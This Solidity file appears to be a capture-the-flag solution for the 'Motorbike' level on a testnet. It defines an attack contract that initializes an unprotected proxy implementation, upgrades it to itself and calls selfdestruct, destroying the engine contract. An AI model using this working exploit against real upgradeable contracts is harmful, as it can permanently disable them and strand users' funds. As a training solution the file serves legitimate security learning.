// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

// Motorbike contract (0x0A56A8bD0ee6F8F843722bbc33f569184c22EfeB)                    
// is a proxy contract that delegates calls to the engine contract.

// Engine (implementation) contract (0xdb62eCf5b813d2E668C4c0fB1502F4B120C22833)
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// https://sepolia.etherscan.io/address/0xdb62eCf5b813d2E668C4c0fB1502F4B120C22833

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract MotorbikeAttack {
    IEngine engine;

    constructor(address _engine) public {
        engine = IEngine(_engine);
    }

    function attack() external {
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() external {
        selfdestruct(address(0));
    }
}
